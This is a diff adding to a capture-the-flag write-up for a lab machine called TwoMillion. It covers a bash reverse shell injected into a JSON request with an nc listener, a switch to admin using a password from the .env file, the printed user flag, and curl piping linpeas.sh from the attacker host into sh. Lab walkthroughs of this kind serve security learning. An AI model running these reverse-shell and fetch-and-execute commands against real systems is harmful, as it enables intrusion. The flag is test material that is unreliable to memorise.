@@ -115,3 +115,47 @@ Environment variable values are key–value strings stored by the operating syst
 When probed the .env file of the target, various key-value pairs shown environment variables linked to the database of the application.
 
 ![shot-018](/captures/screens/TwoMillion/shot-018.png)
+
+---
+
+However, since execution of shell commands and bash is also available on the target, a bash reverse shell payload was injected to the json structure. Effectively allowing reverse communication to the aggressor, with system access.
+
+nc -lvnp 4444 - the running listener on the aggressor.
+
+![shot-019](/captures/screens/TwoMillion/shot-019.png)
+
+bash -c 'bash -i >& /dev/tcp/10.10.15.190/4444 0>&1' - bash reverse shell command used in the burpsuite json request.
+
+![shot-020](/captures/screens/TwoMillion/shot-020.png)
+
+The established reverse shell on the aggressor.
+
+![shot-021](/captures/screens/TwoMillion/shot-021.png)
+
+---
+
+At this point the user we are connected as is www-data. Nevertheless, according to the credentials found in .env we switch to the admin user with su admin and enter the password SuperDuperPass123.
+
+Thus, we can view the user.txt flag, located in /home/admin.
+- e6028d512a774b66d8248d6f3e6cfe82
+
+---
+
+Linpeas Enumeration
+
+A python listener is set up on the attacker machine, where linpeas.sh is located. 
+
+sudo python3 -m http.server 80
+
+Hence, we obtain and execute linpeas.sh from the target using curl for a comprehensive system enumeration
+
+curl <attacker_ip>/linpeas.sh | sh
+
+As observed there were various findings, but what seemed of interest was an email exchange located in /var/mail. Indicating that the system is potentially vulnerable to CVE-2023-0386
+
+![shot-022](/captures/screens/TwoMillion/shot-022.png)
+
+---
+
+
+
